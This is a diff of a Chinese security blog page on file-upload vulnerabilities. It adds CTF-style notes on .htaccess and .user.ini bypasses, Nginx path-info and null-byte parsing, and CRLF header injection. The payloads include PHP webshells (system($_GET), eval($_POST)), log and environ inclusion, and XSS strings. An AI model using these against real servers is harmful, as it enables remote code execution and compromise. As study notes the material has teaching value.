@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://azumisaki.github.io/img/8.JPEG">
 <meta property="article:published_time" content="2026-04-08T11:48:55.000Z">
-<meta property="article:modified_time" content="2026-04-09T05:09:50.741Z">
+<meta property="article:modified_time" content="2026-04-16T13:01:25.196Z">
 <meta property="article:author" content="AzumiSaki">
 <meta property="article:tag" content="-文件上传漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          662 字
+          1.6k 字
         
       </span>
     
@@ -251,7 +251,7 @@
         
         
         
-          6 分钟
+          14 分钟
         
       </span>
     
@@ -297,7 +297,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年4月9日 下午
+                    本文最后更新于 2026年4月16日 晚上
                   
                 
               </p>
@@ -422,6 +422,81 @@
 <li><p><strong>.user.ini解析绕过</strong>apache中.user.ini文件可以配置同目录文件的部分设置(除PHP_INI_SYSTEM模式的配置以外都可以在.user.ini中进行重写) <strong>注:若没反应记得多刷新一下</strong>(经常这样), 该方法类似于[[文件包含]] (除了不能用伪协议, 相关绕过方法可参考)</p>
 <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini">常用.user.ini设置<br><span class="hljs-attr">1. auto_append_file</span>=filename //一个相当于在每个php文件尾部加上 include(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><span class="hljs-attr">2. auto_prepend_file</span>=filename //一个相当于文件内容开始加上 include(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>    filename实际为路径,可为绝对路径和相对路径<br>    上面两个则为利用文件包含漏洞执行代码<br>使用前提:服务器使用CGI/FastCGl模式,上传目录下要有可执行的php文件来执行include(&#x27;filename&#x27;)<br>    .user.ini只对他同一目录下的文件起作用<br></code></pre></td></tr></table></figure></li>
 </ul>
+<h2 id="Apache服务器"><a href="#Apache服务器" class="headerlink" title="Apache服务器"></a>Apache服务器</h2><h3 id="有关-htaccess文件绕过"><a href="#有关-htaccess文件绕过" class="headerlink" title="有关.htaccess文件绕过"></a>有关.htaccess文件绕过</h3><p>首先要知道.htaccess文件的作用及系统配置文件，所以固有了一系列注入：<br>最常见的：</p>
+<h4 id="1-重写引擎“RewriteEngine”"><a href="#1-重写引擎“RewriteEngine”" class="headerlink" title="1.重写引擎“RewriteEngine”"></a>1.重写引擎“RewriteEngine”</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">Options +Indexes<br>DirectoryIndex /123.txt<br>Header set X-Flag &quot;expr=%&#123;file:/flag&#125;&quot;<br><br>---进阶版---<br><br>RewriteEngine On<br>RewriteCond expr &quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;<br>RewriteRule .* - [E=FLAG_CONTENT:%1]<br>Header set X-Test-Expr &quot;%&#123;FLAG_CONTENT&#125;e&quot;<br></code></pre></td></tr></table></figure>
+
+<h4 id="2-SetHandler-配合-Headers-实现PHP解析"><a href="#2-SetHandler-配合-Headers-实现PHP解析" class="headerlink" title="2. SetHandler 配合 Headers 实现PHP解析"></a>2. <strong>SetHandler 配合 Headers 实现PHP解析</strong></h4><p>利用<code>SetHandler</code>指令配合条件判断，当请求包含特定Header时触发PHP解析：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 基础版本：强制将.jpg解析为PHP</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><br><span class="hljs-comment"># 进阶：配合Header条件（需要mod_headers和mod_setenvif）</span><br><span class="hljs-attribute">SetEnvIf</span> X-Upload-Flag <span class="hljs-string">&quot;CTF&#123;.*&#125;&quot;</span> php_flag<br><span class="hljs-attribute">Action</span> php_flag /cgi-bin/php<br><span class="hljs-attribute">SetHandler</span> php_flag<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-Header-注入配合-auto-prepend-file"><a href="#3-Header-注入配合-auto-prepend-file" class="headerlink" title="3. Header 注入配合 auto_prepend_file"></a>3. <strong>Header 注入配合 auto_prepend_file</strong></h4><p>利用<code>php_value</code>注入PHP配置，通过Header控制包含文件：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 将HTTP头中的X-Forwarded-For作为包含文件路径</span><br><span class="hljs-attribute">SetEnv</span> PHP_VALUE <span class="hljs-string">&quot;auto_prepend_file=/proc/self/environ&quot;</span><br><br><span class="hljs-comment"># 或者利用User-Agent写入日志后包含</span><br><span class="hljs-attribute">SetEnv</span> PHP_VALUE <span class="hljs-string">&quot;auto_prepend_file=/var/log/apache2/access.log&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="4-利用-ErrorDocument-Header-操控"><a href="#4-利用-ErrorDocument-Header-操控" class="headerlink" title="4. 利用 ErrorDocument + Header 操控"></a>4. <strong>利用 ErrorDocument + Header 操控</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 自定义错误页面，配合Header注入XSS</span><br><span class="hljs-attribute">ErrorDocument</span> <span class="hljs-number">404</span> <span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span><br><span class="hljs-attribute">Header</span> always set Content-Type <span class="hljs-string">&quot;text/html&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="5-mod-headers-的-Header-注入攻击"><a href="#5-mod-headers-的-Header-注入攻击" class="headerlink" title="5. mod_headers 的 Header 注入攻击"></a>5. <strong>mod_headers 的 Header 注入攻击</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 反射型Header注入：将用户输入反射到响应头</span><br><span class="hljs-attribute">Header</span> echo X-User-Input<br><br><span class="hljs-comment"># 配合条件判断</span><br><span class="hljs-section">&lt;If <span class="hljs-string">&quot;%&#123;HTTP:X-Attack&#125; == &#x27;1&#x27;&quot;</span>&gt;</span><br>    <span class="hljs-attribute">Header</span> set X-Flag <span class="hljs-string">&quot;flag&#123;htaccess_pwned&#125;&quot;</span><br><span class="hljs-section">&lt;/If&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="6-Content-Type-操控（绕过MIME检查）"><a href="#6-Content-Type-操控（绕过MIME检查）" class="headerlink" title="6. Content-Type 操控（绕过MIME检查）"></a>6. <strong>Content-Type 操控（绕过MIME检查）</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 强制设置Content-Type，绕过前端校验</span><br><span class="hljs-attribute">ForceType</span> application/x-httpd-php<br><span class="hljs-comment"># 或</span><br><span class="hljs-attribute">DefaultType</span> application/x-httpd-php<br></code></pre></td></tr></table></figure>
+
+<h2 id="Nginx服务器"><a href="#Nginx服务器" class="headerlink" title="Nginx服务器"></a>Nginx服务器</h2><p>主要还是靠.user.ini文件来控制</p>
+<p>针对Nginx服务器的文件上传利用与Apache的<code>.htaccess</code>有很大不同，因为<strong>Nginx不支持<code>.htaccess</code>文件</strong>。但Nginx有其他配置文件可以利用，我来详细讲解：</p>
+<hr>
+<h2 id="Nginx与Apache的核心区别"><a href="#Nginx与Apache的核心区别" class="headerlink" title="Nginx与Apache的核心区别"></a>Nginx与Apache的核心区别</h2><table>
+<thead>
+<tr>
+<th align="left">特性</th>
+<th align="left">Apache</th>
+<th align="left">Nginx</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">分布式配置</td>
+<td align="left">支持<code>.htaccess</code></td>
+<td align="left"><strong>不支持</strong>，仅主配置</td>
+</tr>
+<tr>
+<td align="left">配置加载</td>
+<td align="left">目录级动态加载</td>
+<td align="left">仅启动时加载主配置</td>
+</tr>
+<tr>
+<td align="left">上传利用点</td>
+<td align="left"><code>.htaccess</code></td>
+<td align="left"><code>.user.ini</code>、<code>nginx.conf</code>（需覆盖）</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="Nginx文件上传攻击面"><a href="#Nginx文件上传攻击面" class="headerlink" title="Nginx文件上传攻击面"></a>Nginx文件上传攻击面</h3><h4 id="1-user-ini-文件（PHP-FPM环境）"><a href="#1-user-ini-文件（PHP-FPM环境）" class="headerlink" title="1. .user.ini 文件（PHP-FPM环境）"></a>1. <strong>.user.ini 文件（PHP-FPM环境）</strong></h4><p>这是Nginx+PHP-FPM环境下最常见的利用方式，功能类似<code>.htaccess</code>：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 基础用法：包含外部文件</span><br><span class="hljs-attr">auto_prepend_file</span>=/tmp/shell.jpg<br><br><span class="hljs-comment">; 利用HTTP Header写入的环境变量</span><br><span class="hljs-attr">auto_prepend_file</span>=/proc/self/environ<br><br><span class="hljs-comment">; 配合日志包含（Nginx日志路径）</span><br><span class="hljs-attr">auto_prepend_file</span>=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure>
+
+<h4 id="利用流程："><a href="#利用流程：" class="headerlink" title="利用流程："></a><strong>利用流程：</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 上传.user.ini</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;auto_prepend_file=shell.jpg&#x27;</span> &gt; .user.ini<br><br><span class="hljs-comment"># 2. 上传shell.jpg（同目录下）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php system($_GET[1]);?&gt;&#x27;</span> &gt; shell.jpg<br><br><span class="hljs-comment"># 3. 访问同目录下任意PHP文件触发</span><br>curl http://target.com/upload/index.php?1=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="2-Nginx配置注入（nginx-conf覆盖-包含）"><a href="#2-Nginx配置注入（nginx-conf覆盖-包含）" class="headerlink" title="2. Nginx配置注入（nginx.conf覆盖&#x2F;包含）"></a>2. <strong>Nginx配置注入（nginx.conf覆盖&#x2F;包含）</strong></h4><p>如果上传目录恰好是Nginx配置根目录，且存在包含漏洞：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 恶意nginx.conf片段</span><br><span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>    <span class="hljs-attribute">root</span> /var/www/html/upload;<br>    <span class="hljs-attribute">fastcgi_pass</span> <span class="hljs-number">127.0.0.1:9000</span>;<br>    <span class="hljs-attribute">fastcgi_index</span> index.php;<br>    <span class="hljs-comment"># 危险配置：将.jpg解析为PHP</span><br>    <span class="hljs-attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="hljs-variable">$document_root</span><span class="hljs-variable">$fastcgi_script_name</span>;<br>    <span class="hljs-attribute">include</span> fastcgi_params;<br>&#125;<br><br><span class="hljs-comment"># 更隐蔽的：利用map指令注入</span><br><span class="hljs-attribute">map</span> <span class="hljs-variable">$http_x_attack</span> <span class="hljs-variable">$exec</span> &#123;<br>    <span class="hljs-attribute">default</span> <span class="hljs-number">0</span>;<br>    &quot;shell&quot; 1;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="实际利用（需配合目录穿越）："><a href="#实际利用（需配合目录穿越）：" class="headerlink" title="实际利用（需配合目录穿越）："></a><strong>实际利用（需配合目录穿越）：</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如果能覆盖/etc/nginx/conf.d/或包含目录</span><br>curl -T nginx.conf ftp://target.com/etc/nginx/conf.d/shell.conf<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="3-FastCGI-参数注入（PHP-VALUE）"><a href="#3-FastCGI-参数注入（PHP-VALUE）" class="headerlink" title="3. FastCGI 参数注入（PHP_VALUE）"></a>3. <strong>FastCGI 参数注入（PHP_VALUE）</strong></h4><p>通过构造FastCGI请求直接覆盖PHP配置（需要特定条件）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 利用fcgi_exp等工具</span><br><span class="hljs-comment"># 直接设置PHP_VALUE绕过.user.ini限制</span><br>PHP_VALUE = auto_prepend_file = /tmp/shell<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="4-Nginx-文件名解析漏洞（经典）"><a href="#4-Nginx-文件名解析漏洞（经典）" class="headerlink" title="4. Nginx 文件名解析漏洞（经典）"></a>4. <strong>Nginx 文件名解析漏洞（经典）</strong></h4><p>Nginx配置不当导致的解析漏洞，<strong>无需上传配置文件</strong>：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 错误配置示例</span><br><span class="hljs-section">location</span> <span class="hljs-regexp">~ \.php$</span> &#123;<br>    <span class="hljs-attribute">fastcgi_split_path_info</span><span class="hljs-regexp"> ^(.+\.php)(/.+)$</span>;<br>    <span class="hljs-attribute">fastcgi_param</span> PATH_INFO <span class="hljs-variable">$fastcgi_path_info</span>;  <span class="hljs-comment"># 关键漏洞点</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用方式：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 上传shell.jpg，访问：</span><br>curl http://target.com/upload/shell.jpg/.php<br><span class="hljs-comment"># Nginx将shell.jpg交给PHP-FPM解析</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>或利用空字节（旧版本）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://target.com/upload/shell.jpg%00.php<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="5-Nginx-Header-注入（CRLF-Injection）"><a href="#5-Nginx-Header-注入（CRLF-Injection）" class="headerlink" title="5. Nginx Header 注入（CRLF Injection）"></a>5. <strong>Nginx Header 注入（CRLF Injection）</strong></h4><p>如果Nginx配置存在CRLF注入，可注入恶意Header：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 利用场景：Nginx作为反向代理，配置不当</span><br><span class="hljs-attribute">add_header</span> X-User-Input <span class="hljs-variable">$arg_name</span>;<br></code></pre></td></tr></table></figure>
+
+<p><strong>攻击Payload：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 注入新行，控制后续响应头</span><br>curl <span class="hljs-string">&quot;http://target.com/?name=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><br></code></pre></td></tr></table></figure>
+
 <h2 id="实战总结"><a href="#实战总结" class="headerlink" title="实战总结"></a>实战总结</h2><p><strong>后缀被过滤：选.pphphp</strong></p>
 <p><strong><?php fputs(fopen("shell2.php","w"),'<?php @eval($_POST["cmd"]); ?>‘); phpinfo(); ?&gt;</strong></p>
 <p><strong>当一个服务器的黑盒弄不清的话，就试试RCE在网站上创一个php(即上传文件创建文件(必须要用burp的intrude仿反复放包有效才行)</strong></p>
